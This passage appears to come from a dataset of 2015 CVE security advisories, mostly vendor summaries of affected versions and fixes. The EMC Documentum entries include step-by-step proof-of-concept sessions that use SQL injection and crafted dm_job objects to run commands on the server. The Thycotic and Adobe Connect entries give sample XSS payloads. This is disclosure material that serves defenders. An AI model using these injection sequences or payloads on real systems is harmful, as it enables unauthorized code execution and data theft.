in the middle of the tree's branches, whence we can backtrack
quickly).
----[ chfn
util-linux's chfn from Red Hat's codebase is linked with libuser, and
can be exploited by our public roothelper.c with just a few changes
(left as an exercise for the interested reader):
- userhelper uses a simple Userhelper/Consolehelper request/response
protocol in order to prompt for and read the user's password, but chfn
uses traditional terminal interaction;
- if our user's line is the last one in /etc/passwd, we can exploit
Vulnerability #1 against userhelper, but we have to win Problem #3's
write/ftruncate race against chfn;
- userhelper returns 0/255 on success/failure, but chfn returns 0/1.
--[ Acknowledgments ]---------------------------------------------------------
We would like to thank Red Hat's Security Response Team and developers
for promptly addressing these issues."
4426,Logstash vulnerability CVE-2015-5378,,CVE-2015-5378,"Summary:
Logstash 1.5.2 and prior versions are vulnerable to a SSL/TLS security issue called the FREAK attack. If you are using the Lumberjack input, FREAK allows an attacker to successfully implement a man in the middle attack, intercepting communication between the Logstash Forwarder agent and Logstash server.
Note: Only deployments using the Logstash Forwarder or the Lumberjack input are affected by this vulnerability.
Fixed versions:
Version 1.5.3 and 1.4.4 has been patched with a fix that addresses this vulnerability.
Remediation:
Users that currently use Logstash Forwarder in combination with Lumberjack input in Logstash or may want to use it in the future should upgrade to 1.5.3 or 1.4.4.
Users that do not want to upgrade can address the vulnerability by disabling the Lumberjack input. Please note that you will not be able to use Logstash Forwarder after the Lumberjack input is disabled.
Credit:
Accenture Security Team discovered this issue. Paul Kloves from Accenture has been coordinating with us.
CVSS
Overall CVSS Score: 4.3"
4428,CVE-2015-5379: Axigen XSS vulnerability for html attachments,,CVE-2015-5379,"CVEID: CVE-2015-5379
SUBJECT: Axigen XSS vulnerability for html attachments
DESCRIPTION: Axigen's WebMail Ajax interface implements a view
attachment function that executes javascript code that is part of email
HTML attachments.
This allows a malicious user to craft email messages that could expose
an Axigen WebMail Ajax user to cross site scripting or other attacks
that rely on arbitrary javascript code running within a trusted domain.
Axigen versions starting with 9.0 address this issue by limiting the
attachment types that are loaded in the browser.
For earlier Axigen versions patches are available on the Axigen support
channel.
Affected Products and Versions: Axigen Mail Server [1] 8.x versions
Vendor Internal ID: AXI-CVE-20150601
Vendor security advisory : [2]
Reported by: An anonymous researcher working with Beyond Security's
SecuriTeam Secure Disclosure program [3]
[1] https://www.axigen.com
[2] https://www.axigen.com/knowledgebase/Ajax-WebMail-8-x-security-patch-CVE-2015-5379-_341.html
[3] http://www.beyondsecurity.com/ssd.html"
4444,Elasticsearch CVE-2015-5531,,CVE-2015-5531,"Summary:
Elasticsearch versions from 1.0.0 to 1.6.0 are vulnerable to a directory traversal attack that allows an attacker to retrieve files that are readable by the Elasticsearch JVM process.
We have been assigned CVE-2015-5531 for this issue.
Fixed versions:
Versions 1.6.1 and 1.7.0 address the vulnerability.
Remediation:
Users should upgrade to the 1.6.1 or 1.7.0 releases. Users that do not wish to upgrade can use a firewall, reverse proxy, or Shield to prevent snapshot API calls from untrusted sources.
CVSS
Overall CVSS score: 2.6
Credits:
Benjamin Smith reported the issue."
4445,Elasticsearch CVE-2015-5377,,CVE-2015-5377,"Summary:
Elasticsearch versions prior to 1.6.1 are vulnerable to an engineered attack on its transport protocol that enables remote code execution. This issue is related to the Groovy announcement in CVE-2015-3253.
Deployments are vulnerable even when Groovy dynamic scripting is disabled.
We have been assigned CVE-2015-5377 for this issue.
Fixed versions:
Version 1.6.1 and 1.7.0 address the vulnerability.
Remediation:
Users should upgrade to the 1.6.1 or 1.7.0 release.
Users that do not want to upgrade can address the vulnerability by securing the transport protocol port (default 9300) to allow access by only trusted agents.
CVSS
Overall CVSS score: 5.1
Credits:
cpnrodzc7 working with HP's Zero Day Initiative (ZDI) found a similar issue with Elasticsearch."
4452,CVE-2015-4670 - AjaxControlToolkit File Upload Directory Traversal,,CVE-2015-4670,"The AjaxControlToolkit prior to version 15.1 has a file upload directory
traversal vulnerability which on a poorly configured web server can lead to
remote code execution.
The issue affects any application using the AjaxFileUpload control. The
vulnerability arises because the =E2=80=9CfileId=E2=80=9D is not validated =
and can be
altered by the user to contain directory traversal characters (......)
allowing an attacker to write the uploaded file to any location on the file
system that the web server=E2=80=99s file permissions allow.
The ""fileid"" parameter is passed when uploading files. Intercepting the
request and modifying the value of ""fileid"" to a directory path will result
in the file being uploaded to be placed in the location on the remote
server as long as file system permissions allow. If an attacker is capable
of writing an arbitrary file to the server's web directory then remote code
execution is possible. A demonstration of this is written here:
http://www.cardinaleconcepts.com/cve-2015-4670-directory-traversal-to-remot= <http://www.cardinaleconcepts.com/cve-2015-4670-directory-traversal-to-remot=>
e-code-execution-in-ajaxcontroltoolkit/
This issue has been reported to the vendor and an updated version of the
library has been made available.
CVE Number: CVE-2015-4670
Discovered by: Brian Cardinale
Write Up:
http://www.cardinaleconcepts.com/cve-2015-4670-directory-traversal-to-remot= <http://www.cardinaleconcepts.com/cve-2015-4670-directory-traversal-to-remot=>
e-code-execution-in-ajaxcontroltoolkit/
Sample Vuln App: https://bitbucket.org/bcardinale/cve-2015-4670-vuln-app/sr= <https://bitbucket.org/bcardinale/cve-2015-4670-vuln-app/sr=>
c
Affected Versions:
* 7.1213.0
* 7.1005.0
* 7.1002.0
* 7.930.0
* 7.725.0
* 7.607.0
* 7.429.0"
4463,"CVE-2014-7952, Android ADB backup APK injection vulnerability",,CVE-2014-7952,"The Android operating system offers a backup/restore mechanism of
installed packages through the ADB utility. Full backup of applications
including the private files stored on /data partition is performed by
default, but applications can customize this behavior by implementing a
BackupAgent class. This way they can feed the backup process with custom
files and data.
SEARCH-LAB Ltd. discovered a vulnerability in the design of the Android
backup mechanism: the backup manager, which invokes the custom
BackupAgent does not filter the data stream returned by the
applications. A malicious BackupAgent (without any Android permissions)
is able to inject additional applications (APKs) through reflection into
the backup archive without the user's consent. Upon restoration of the
backup archive, the system installs the injected, additional application
(since it is already part of the backup archive). The installed malware
could gain any (non-system) permissions it wanted without any
confirmation dialogs.
SEARCH-LAB Ltd. reported the vulnerability to the Android security team
on July 14, 2014, but the issue was still not fixed. This means as of
today, July 10, 2015 all current Android versions are affected,
including L (5.1.1).
Further information, technical details and working Proof of Concept code
can be found here:
https://github.com/irsl/ADB-Backup-APK-Injection/
http://www.search-lab.hu/about-us/news/110-android-adb-backup-apk-injection-vulnerability"
4470,Extra information for CVE-2014-2513 - EMC Documentum Content Server: arbitrary code execution,,CVE-2014-2513,"Product: EMC Documentum Content Server
Vendor: EMC
Version: ANY
CVE: N/A
Risk: High
Status: public/not fixed
On November 2013 I discovered vulnerability in EMC Documentum Content Server
which allow authenticated user to execute arbitrary commands using
dm_bp_transition docbase method (for detailed description see
VRF#HUFPRMOP.txt).
On July 2014 vendor announced ESA-2014-064 which was claiming that
vulnerability has been remediated.
On November 2014 fix was contested (there was significant delay after
ESA-2014-064 because vendor constantly fails to provide status of reported
vulnerabilities) by providing another proof of concept, description provided
to CERT/CC (another CNA was chosen because vendor fails to communicate) was:
=================================8<================================
I have tried to reproduce PoC, described in VRF#HUFPRMOP, and got following
error:
[ErrorCode] 1000 [Parameter] 0801fd08805c9dfe [ServerError] Unexpected
error: [DM_API_W_NO_MATCH]warning: ""There was no match in the
docbase for the qualification: dm_procedure where r_object_id =
'0801fd08805c9dfe'""
Such behaviour means that EMC tried to remediate a security issue by
“checking” object type of supplied object:
Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle
Session id is s0
API> id,c,dm_procedure where r_object_id = '0801fd08805c9dfe'
...
[DM_API_W_NO_MATCH]warning: ""There was no match in the docbase for the
qualification: dm_procedure where r_object_id = '0801fd08805c9dfe'""
API> Bye
bin]$ strings dmbasic| grep dm_procedure
id,%s,dm_procedure where object_name = '%s' and folder('%s')
id,%s,dm_procedure where r_object_id = '%s'
# old version of dmbasic binary
bin]$ strings dmbasic| grep dm_procedure
bin]$
So, the fix was implemented in dmbasic binary, the problem is neither 6.7
SP2 P15 nor 6.7 SP1 P28 patches contain dmbasic binary - the first patch
that was shipped with dmbasic binary was 6.7SP2 P17. Moreover, the
issue is still reproducible because introduced check could be bypassed
using SQL injection:
~]$ cat test.ebs
Public Function EntryCriteria(ByVal SessionId As String,_
ByVal ObjectId As String,_
ByVal UserName As String,_
ByVal TargetState As String,_
ByRef ErrorString As String) As Boolean
t = ShellSync(""echo dm_bp_transition_has_vulnerability > /tmp/test"")
EntryCriteria=True
End Function
~]$ cat /tmp/test
cat: /tmp/test: No such file or directory
~]$ iapi
Please enter a docbase name (docubase): repo
Please enter a user (dmadmin): test01
Please enter password for test01:
EMC Documentum iapi - Interactive API interface
(c) Copyright EMC Corp., 1992 - 2011
All rights reserved.
Client Library Release 6.7.2190.0142
Connecting to Server using docbase repo
[DM_SESSION_I_SESSION_START]info: ""Session 0101fd088014000c started for
user test01.""
Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle
Session id is s0
API> create,c,dm_sysobject
...
0801fd08805c9dfe
API> set,c,l,object_name
SET> test
...
OK
API> setfile,c,l,test.ebs,crtext
...
OK
API> save,c,l
...
OK
API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
repo repo dmadmin """" 0000000000000000 0000000000000000
0000000000000000 ""0801fd08805c9dfe,'' union select r_object_id
from dm_sysobject where r_object_id=''0801fd08805c9dfe""
0000000000000000 0000000000000000 0000000000000000 """"
0 0 T F T T dmadmin 0000000000000000'
...
(1 row affected)
API> Bye
~]$ cat /tmp/test
dm_bp_transition_has_vulnerability
~]$
Here ‘union …’ allows to bypass check based on ""id"" call:
Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle
Session id is s0
API> id,c,dm_procedure where r_object_id='0801fd08805c9dfe,' union
select r_object_id from dm_sysobject where
r_object_id='0801fd08805c9dfe'
...
0801fd08805c9dfe
API> apply,c,,GET_LAST_SQL
...
q0
API> next,c,q0
...
OK
API> get,c,q0,result
...
select all dm_procedure.r_object_id from dm_procedure_sp dm_procedure where
((dm_procedure.r_object_id='0801fd08805c9dfe,')) and
(dm_procedure.i_has_folder = 1 and dm_procedure.i_is_deleted = 0)
union select all dm_sysobject.r_object_id from dm_sysobject_sp
dm_sysobject where ((dm_sysobject.r_object_id= '0801fd08805c9dfe'))
and (dm_sysobject.i_has_folder = 1 and dm_sysobject.i_is_deleted = 0)
API> close,c,q0
...
OK
Comma is required to bypass error in fetch call:
API> fetch,c,0801fd08805c9dfe' union select r_object_id from
dm_sysobject where r_object_id='0801fd08805c9dfe
...
[DM_API_E_BADID]error: ""Bad ID given: 0801fd08805c9dfe' union
select r_object_id from dm_sysobject where r_object_id=
'0801fd08805c9dfe""
API> fetch,c,0801fd08805c9dfe,' union select r_object_id from
dm_sysobject where r_object_id='0801fd08805c9dfe
...
OK
=================================>8================================
__
Regards,
Andrey B. Panfilov"
4502,CVE-2015-3442 Authentication Bypass in Xpert.Line Version 3.0,,CVE-2015-3442,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: Xpert.Line
# Vendor: Soreco AG [1]
# CVE ID: CVE-2015-3442
# Subject: Authentication Bypass
# Risk: Critical
# Effect: Remotely exploitable
# Authors: Alessandro Zala (alessandro.zala csnc ch)
# Andreas Hunkeler (andreas.hunkeler csnc ch)
# Date: 06.03.2015
#
#############################################################
Introduction:
-------------
The Xpert.Line software [2] is a Human Resources Management solution that helps
companies administrating information assets of their employees. It manages
all the private information about the employees. Compass Security [3] found a
vulnerability that allows an attacker to impersonate other users by only
knowing the username of the person. With this flaw a user can bypass the
authentication mechanism and achieve highest privileges to access personal
information like the salary of any employee or manipulate security settings
(e.g. accounts) of the application.
Affected:
---------
Xpert.Line Version 3.0 (Xpert.Center). Other versions have not been tested.
Vulnerability Description:
--------------------------
Xpert.Line has several authentication mechanisms to authenticate the user to the
application. One of the authentication mechanisms relies only on client-side
functionalities. When the Xpert.Line Windows client is started, it first
retrieves the username of the current logged-in Windows user by using an API
call to ""getUserNameA"" from the Windows built-in library ""advapi32.dll"". This
information is then sent to the server to authenticate the user to Xpert.Line
and it is also used for all subsequent requests to the server.
Impact:
-------
A malicious user can impersonate any user by intercepting the above mentioned
API call to ""getUserNameA"" in ""advapi32.dll"" and change the value returned to
an arbitrary name. This allows impersonating higher privileged users to access
sensitive information like salary information or to create new administrator
accounts.
Workaround / Fix:
-----------------
The affected authentication mechanism can be deactivated. The vendor currently
is not willing to remove this authentication mechanism. Instead, vendor offers
more secure authentication mechanisms and considers this a configuration issue.
To deactivate the affected unsecure authentication method do the following:
1. Go to Xpert.Security
2. Got to ""change environment"" settings
3. Change the authentication type to a secure setting (e.g. LDAPs)
Source: Xpert.Security LDAP documentation, received from vendor on 06.03.2015
Timeline:
---------
29.01.2015: Vulnerability detected
19.02.2015: Initial contact, conference call with vendor
03.03.2015: CVE ID requested
03.03.2015: Request vendor's security contact information (info soreco ch)
05.03.2015: 2nd Request vendor's security contact information (info soreco ch)
05.03.2015: Vendor notification with technical details to contact person via
secured channel
05.03.2015: Conference call with vendor discussing finding and next steps
06.03.2015: 2nd conference call with vendor to discuss workaround and
publication, vendor approved immediate publication
29.04.2015: CVE ID received: CVE-2015-3442
02.07.2015: Public disclosure
Very positive was the handling of the notification. The vendor was very
responsive to our notification and was very willing to cooperate with us.
References:
-----------
[1] http://www.sorecoweb.ch/home/
[2] http://www.xpertline.ch/
[3] http://www.csnc.ch/en/"
4514,"Extra information for CVE-2014-4626 - EMC Documentum Content Server: authenticated user is able to elevate privileges, hijack Content Server filesystem, execute arbitrary commands by creating malicious dm_job objects",,CVE-2014-4626,"Product: EMC Documentum Content Server
Vendor: EMC
Version: ANY
CVE: N/A
Risk: High
Status: public/not fixed
On April 2014 I discovered vulnerability in EMC Documentum Content Server
which allow authenticated user to elevate privileges, hijack Content Server
filesystem or execute arbitrary commands by creating malicious dm_job
objects (for detailed description see VRF#HUFU6FNP.txt and VRF#HUFV0UZN.txt).
On October 2014 vendor announced ESA-2014-105 which was claiming that
vulnerability has been remediated.
On November 2014 fix was contested (there was significant delay after
ESA-2014-105 because vendor constantly fails to provide status of reported
vulnerabilities) by providing PoC similar to described in VRF#HUGC34JH.txt,
description provided to CERT/CC (another CNA was chosen because vendor
fails to communicate) was:
=================================8<================================
The problem is that non-privileged user is able to create dm_job objects and
execute corresponding docbase methods (some examples of ""malicious"" methods
are given in VRF#HUFU6FNP, also see VRF#HUFV0UZN), the word ""create"" here
does mean some sequence of commands which result to existence of dm_job
object. PoC in VRF#HUFU6FNP describes attack on scheduler - scheduler does
not schedule jobs unless they are owned by superuser, so, the command
sequence in that case was: ""create dm_job and update dm_job"", EMC thinks
that they have fixed vulnerability, but they just fixed the sequence given
in PoC, another sequence is ""create dm_sysobject, update dm_sysobject &
change dm_sysobject"" - see VRF#HUGC34JH, it's already known attack.
Also, I could provide third PoC related to this report, but I do not think
that would be useful for EMC.
=================================>8================================
Current status of CVE-2014-4626 is obscure, last public status could be
found in CERT/CC spreadsheet (http://www.kb.cert.org/vuls/id/315340):
=================================8<================================
The new exploit is being tracked under PSRC-2494.
This is targeted for Q1 2015 (March patch).
=================================>8================================
Though latest builds of EMC Documentum Content Server successfully pass PoCs
described previously:
=================================8<================================
API> create,c,dm_job
...
08024be980006902
API> set,c,l,owner_name
SET> dmadmin
...
OK
API> set,c,l,world_permit
SET> 7
...
OK
API> save,c,l
...
[DM_SYSOBJECT_E_CANT_CHANGE_OWNER_NAME]error:
""Must have system admin privileges or superuser privileges
to change the owner_name to 'dmadmin'.""
API> create,c,dm_sysobject
...
08024be980006904
API> set,c,l,owner_name
SET> dmadmin
...
OK
API> set,c,l,world_permit
SET> 7
...
OK
API> save,c,l
...
OK
API> ?,c,change dm_sysobject object to dm_job
where r_object_id='08024be980006904'
[DM_QUERY_F_CHANGE_SAVE]fatal: ""CHANGE: An unexpected save
error has occurred for object 08024be980006904.""
[DM_USER_E_NEED_SU_OR_SYS_FOR_OBJECT_CHANGE]error:
""The current user (test) needs to have superuser or sysadmin
privilege to create or save or destroy objects of type (dm_job).""
=================================>8================================
the vulnerability remains unfixed, below is a another PoC (job engine in
Documentum consists of two parts: scheduler and executor, previous attacks
were designed to exploit vulnerability in scheduler, this one demonstrates
how to exploit vulnerability in job executor):
=================================8<================================
API> create,c,dm_job
...
08024be98000690e
API> set,c,l,object_name
SET> malicious job
...
OK
API> set,c,l,inactivate_after_failure
SET> 0
...
OK
API> set,c,l,max_iterations
SET> 0
...
OK
API> set,c,l,method_name
SET> dm_file_writer
...
OK
API> set,c,l,pass_standard_arguments
SET> 0
...
OK
API> set,c,l,run_interval
SET> 1
...
OK
API> set,c,l,run_mode
SET> 1
...
OK
API> set,c,l,run_now
SET> 1
...
OK
API> set,c,l,is_inactive
SET> 0
...
OK
API> set,c,l,world_permit
SET> 7
...
OK
API> append,c,l,method_arguments
SET> /tmp/test.txt
...
OK
API> append,c,l,method_arguments
SET> agentexec_has_vulnerability
...
OK
API> append,c,l,method_arguments
SET> CREATE
...
OK
API> save,c,l
...
OK
API> apply,c,,DO_METHOD,METHOD,S,agent_exec_method,
ARGUMENTS,S,'
-docbase_name DCTM_DEV.DCTM_DEV
-docbase_owner dmadmin
-job_id 08024be98000690e
-log_directory /u01/documentum/cs/dba/log
-docbase_id 150505
-trace_level 10
'
...
q0
API> next,c,q0
...
OK
API> dump,c,q0
...
USER ATTRIBUTES
result : 0
process_id : 91436
launch_failed : F
method_return_val : 0
os_system_error : No Error
timed_out : F
time_out_length : 60
app_server_host_name :
app_server_port : 0
app_server_uri :
error_message :
SYSTEM ATTRIBUTES
APPLICATION ATTRIBUTES
INTERNAL ATTRIBUTES
API> Bye
~]$ cat /tmp/test.txt
agentexec_has_vulnerability
=================================>8================================
__
Regards,
Andrey B. Panfilov"
4523,CVE-2015-4674 - TimeDoctor autoupdate over plain-HTTP,,CVE-2015-4674,"TimeDoctor claims to be a software that helps to improve the
productivity of teams, reduce time spent on distractions [1]
Vulnerability:
TimeDoctor autoupdate feature downloads and executes files over plain
HTTP and doesn't perform any check with the files. An attacker with
MITM capabilities (i.e., when user connects to a public wifi) could
override the Timedoctor subdomain and then execute custom binaries on
the machine where the application is running.
The update mechanisms first downloads update.xml [2] which has
the version number, url and a filename for the new
installer.
Credit:
Fernando Muñoz
CVE:
CVE-2015-4674
Version tested:
TimeDoctor Pro 1.4.72.3 for Windows
Other editions/versions maybe affected.
Demo video:
https://www.youtube.com/watch?v=t1JM4DaR130
Vendor acknowledged the issue on Jun 18 and a new version should be
available today (Jun 29).
[1] https://www.timedoctor.com/about-us.html
[2] http://updates.timedoctor.com/download/_production/tdpro/windows/update.xml"
4541,CSRF Vulnerability in C2Box application CVE-2015-4460,,CVE-2015-4460,"Please add this advisory to your archive.
Thanks.
#####################################
Title: Cross-Site Request Forgery (CSRF) Vulnerability in C2Box application Allows adding an Admin User or reset any user's password.
Author: Wissam Bashour - Help AG Middle East
Vendor: boxautomation(B.A.S)
Product: C2Box
Version: All versions below 4.0.0(r19171)
Tested Version: Version 4.0.0(r19171)
Severity: HIGH
CVE Reference: CVE-2015-4460
# About the Product:
B.A.S C2Box provides global solutions enabling full control and visibility over cash positions and managing domestic or cross border payment processes.
# Description:
This Cross-Site Request Forgery vulnerability enables an anonymous attacker to add an admin account into the application. This leads to compromising the whole domain as the application normally uses privileged domain account to perform administration tasks.
Also the attacker can reset any user's password after gaining the privileged account.
# Vulnerability Class:
Cross-Site Request Forgery (CSRF) - https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
# How to Reproduce: (POC):
Host the attached code in a webserver. Then send the link to the application Admin. The admin should be logged in when he clicks on the link.
You can entice him to do that by using social engineering techniques.
Say for example: Log into the application and click the following link to get free licenses
# Disclosure:
Discovered: June 10, 2015
Vendor Notification: June 10, 2015
Advisory Publication: June 27, 2015
Public Disclosure: June 27, 2015
# Solution:
Upgrade to the latest Build will fix this issue.
The new version number is 15.6.22
Release date: June 22, 2015
&#8195;
# credits:
Wissam Bashour
Associate Security Analyst
Help AG Middle East
# Proof of Concept Code:
https://raw.githubusercontent.com/Siros96/CSRF/master/PoC
https://www.dropbox.com/s/i45wzl6cqavrzm4/PoC_CSRF_password_reset.mp4?dl=0
#References:
[1] help AG middle East http://www.helpag.com/.
[2] http://www.boxautomation.com/.
[3] https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
[4] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures."
4551,"CVE-2015-3931 Microsec e-Szigno, CVE-2015-3932 Netlock Mokka XSW vulnerability",,CVE-2015-3931,"In November 2014, SEARCH-LAB Ltd. discovered a security vulnerability in Microsec e-Szigno, and Netlock Mokka computer applications that are used to generate and validate
digital signatures, which are applied within the official Hungarian government processes. The vulnerability affected the „e-akta” signed document file format, where a file with a valid digital signature could be manipulated in a way that the verification software indicated a valid signature while it displayed a different document than the original.
The vulnerability details were disclosed to the affected vendors and the fixed version of the softwares were released in December, 2014.
Affected versions:
Microsec e-Szigno (older than v3.2.7.12): CVE-2015-3931
Netlock Mokka (older than v2.7.8.1204): CVE-2015-3932
The vulnerability is classified as XML Signature Wrapping. It could be triggered by inserting a new ""ds:Object"" node with arbitrary document payload before the original ds:Object.
The two software implementations were independent, they did not share a common codebase. The reason why both were vulnerable, is not connected to the format specification either, but two different developers independently made mistakes in implementing signatures.
References:
https://www.search-lab.hu/about-us/news/107-37-million-digitally-signed-documents-had-to-be-reverified
https://www.search-lab.hu/eakta
http://www.neih.gov.hu/?q=node/66"
4565,CVE-2015-4464 Insufficient Authorization Checks Request Handling Remote Authentication Bypass for Kguard Digital Video Recorders,,CVE-2015-4464,"CVEID: CVE-2015-4464
SUBJECT: Insufficient Authorization Checks Request Handling Remote
Authentication Bypass for Kguard Digital Video Recorders
DESCRIPTION: A deficiency in handling authentication and authorization
has been found with Kguard 104/108/v2 models. While password-based
authentication
is used by the ActiveX component to protect the login page, all the
communication
to the application server at port 9000 allows data to be communicated
directly
with insufficient or improper authorization.
CVSS Base Score: 9.7
CVSS Temporal Score: 8.3
CVSS Environmental Score: Undefined
CVSS Vector: (AV:N/AC:L/Au:N/C:C/I:C/A:P/E:F/RL:U/RC:UR)
Affected Products and Versions
Kguard Digital Video Recorders: KG-SHA104/KG-SHA108/v2. Other variants
that runs
the same firmware from Zhuhai Raysharp Technology Co Ltd, are believed to
be vulnerable.
Exploit / Proof of Concept:
https://goo.gl/L5ASRo
Remediation/Fixes
None.
Workarounds and Mitigations
See: [06]
References:
[01] http://www.securityfocus.com/archive/1/534830
[02]
http://us.kworld-global.com/main/prod_in.aspx?mnuid=1306&modid=10&prodid=527
[03] http://osvdb.org/show/osvdb/119402
[04] http://osvdb.org/show/osvdb/119422
[05] http://osvdb.org/show/osvdb/119403
[06]
https://www.academia.edu/11677554/Kguard_Digital_Video_Recorders_Multiple_Vulnerabilities"
4566,CVE-2015-3443 XSS in Thycotic Secret Server version 8.6.000000 to 8.8.000004,,CVE-2015-3443,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# CVE ID : CVE-2015-3443
# Product: Secret Server [1]
# Vendor: Thycotic
# Subject: Stored Cross-Site Scripting Vulnerability (XSS)
# Risk: High
# Effect: Remotely exploitable
# Author: Marco Delai (marco.delai csnc ch)
# Date: June 24th 2015
#
#############################################################
Introduction:
-------------
Thycotic Secret Server enterprise password management software allows
the creation, management and control of critical passwords in one
centralized, web-based repository [1].
The identified vulnerability (stored Cross-Site Scripting) allows the
execution of JavaScript code in the browser of a valid user when it
toggle the password mask on a specially crafted password. This allows,
for example, an attacker to prepare a specially crafted shared password,
which when read by another user, can steal all other passwords the
victim has access to.
Vulnerable:
-----------
Secret Server customers on version 8.6.000000 to 8.8.000004 [2].
Technical Details
--------------------
Exploiting the vulnerability simply requires to:
1. Create a new password entry within Secret Server with the following
value: ""Compass Security<script>alert(""Compass Security"")</script>""
2. Open the basic dashboard and toggle the password mask. The password
is retrieved from the server using an AJAX call and its value is
added straight to the page's DOM without validation. Thus, the
script included in step 1 is executed.
Note that the payload defined in step 1 did only get executed in the
basic dashboard view. The advanced dashboard did adequately encode the
password. Extract of the vulnerable page:
GET
/SecretServer/api.ashx/simplehome/GetSecretItemValue?secretItemId=[...]&audi
tAction=unmask HTTP/1.1
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Length: 62
Content-Type: application/json; charset=utf-8
Expires: -1
[...]
Content-Security-Policy: connect-src 'self'; font-src 'self';
frame-src 'self' sslauncher:; img-src 'self' data:; media-src 'self';
object-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'
'unsafe-inline' 'unsafe-eval'
X-Content-Security-Policy: connect-src 'self'; font-src 'self';
frame-src 'self' sslauncher:; img-src 'self' data:; media-src 'self';
object-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'
'unsafe-inline' 'unsafe-eval'
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-UA-Compatible: IE=edge

""Compass Security<script>alert(""Compass Security"")</script>""
Remediation:
------------
Update Secret Server to the latest version, which fixes the
vulnerability [2].
Milestones:
-----------
2015-02-19 Vulnerability discovered
2015-02-20 Vulnerability reported to vendor
2015-02-20 Vendor patch [2]
2015-06-24 Public disclosure
References:
-----------
[1] http://thycotic.com/products/secret-server/
[2]
http://thycotic.com/products/secret-server/resources/advisories/thy-ss-004/"
4576,[CVE-2015-3188] Apache Storm remote code execution vulnerability,,CVE-2015-3188,"CVE-2015-3188: Apache Storm remote code execution vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Storm 0.10.0-beta
Description:
The UI daemon in Apache Storm 0.10.0-beta allows remote users to run
arbitrary code as the user running the web server. With kerberos
authentication this could allow impersonation of arbitrary users on other
systems, including HDFS and HBase.
Mitigation:
0.10.0-beta users should upgrade to 0.10.0-beta1 or disable the Storm UI
daemon.
Apache Storm 0.10.0-beta1 artifacts are available for immediate download here:
http://www.us.apache.org/dist/storm/apache-storm-0.10.0-beta1/
Credit:
This issue was discovered by Bobby Evans of the Apache Storm PMC
References:
https://github.com/apache/storm/blob/v0.10.0-beta1/SECURITY.md
https://github.com/apache/storm/blob/v0.10.0-beta1/STORM-UI-REST-API.md
P. Taylor Goetz"
4615,XSS vulnerability Adobe Connect 9.3 (CVE-2015-0343 ),,CVE-2015-0343,"Advisory: Adobe Connect Reflected XSS
Author: Stas Volfus (Bugsec Information Security LTD)
Vendor URL: http://www.adobe.com/
Status: Vendor Notified
==========================
Vulnerability Description
==========================
Adobe Connect (Central) version: 9.3 is vulnerable to Reflected XSS (Cross Site Scripting).
The attack allows execution of arbitrary JavaScript in the context of the user�s browser.
CVE id: CVE-2015-0343 assigned for this issue.
==========================
PoC
==========================
The following URL demonstrates the vulnerability:
https://vulnerablewebsite.com/admin/home/homepage/search?account-id=1&filter-rows=1&filter-start=0&now=yes&query=<a href=""javascript:alert('XSS')"">XSS Link</a>
==========================
Disclosure Timeline
==========================
04-NOV-2014 - Vendor notified
01-DEC-2014 - CVE assigned
27-MAR-2015 - Resolved by vendor, fix deployed on Adobe Connect 9.4.
==========================
References
==========================
http://www.adobe.com/il_en/products/adobeconnect.html
https://helpx.adobe.com/adobe-connect/release-note/connect-94-release-notes.html"
4625,Elasticsearch vulnerability CVE-2015-4165,,CVE-2015-4165,"Summary:
Elasticsearch versions 1.0.0 - 1.5.2 are vulnerable to an engineered attack on other applications on the system. The snapshot API may be used indirectly to place snapshot metadata files into locations that are writeable by the user running the Elasticsearch process. It is possible to create a file that another application could read and take action on, such as code execution.
This vulnerability requires several conditions to be exploited. There must be some other application running on the system that would read Lucene files and execute code from them. That application must also be accessible to the attacker, e.g. over the network. Lastly, the Java VM running the Elasticsearch process must be able to write into a location that the other application will read and potentially execute.
We have been assigned CVE-2015-4165 for this issue.
Fixed versions:
Version 1.6.0 address the vulnerability by adding configuration to limit the filesystem paths that the Java VM can write into.
Remediation:
Users should upgrade to the 1.6.0 release.
Users that do not want to upgrade can address the vulnerability in any of several ways:
- ensure that there are no other applications running on the Elasticsearch server
- ensure that the Elasticsearch JVM cannot write a directory that other applications read from
- use a firewall, reverse proxy, or Shield to prevent snapshot API calls from some or all users
- ensure that other applications running on the server are not accessible to attackers
CVSS
Overall CVSS score: 5.1"
4626,Logstash vulnerability CVE-2015-4152,,CVE-2015-4152,"Summary:
Logstash versions 1.4.2 and prior are vulnerable to a directory traversal attack that allows an attacker to over-write files on the server running Logstash. This vulnerability is not present in the initial installation of Logstash. The vulnerability is exposed when the file output plugin is configured for use. The files impacted must be writeable by the user that owns the Logstash process.
We have been assigned CVE-2015-4152 for this issue.
Fixed versions:
Versions 1.5.0 and 1.4.3 have addressed the vulnerability.
Remediation:
Users that currently use the file output plugin or may use it in the future should upgrade to 1.5.0 or 1.4.3. This will address the vulnerability and preserve file output functionality.
Users that do not want to upgrade can address the vulnerability by disabling the file output plugin.
Credit:
Colin Coghill reported this issue.
CVSS
Overall CVSS score: 4.3"
4627,Kibana vulnerability CVE-2015-4093,,CVE-2015-4093,"Summary:
Kibana versions 4.0.0, 4.0.1 and 4.0.2 are vulnerable to a cross-site scripting (XSS) attack. The attack allows execution of arbitrary JavaScript in the context of the user’s browser.
We have been assigned CVE-2015-4093 for this issue.
Fixed versions:
Versions 4.0.3 and 4.1.0 have addressed the vulnerability.
Remediation:
Users running with Kibana 4.0.0-4.0.2 should upgrade to 4.0.3. This will address the vulnerability.
CVSS
Overall CVSS score: 5.4"
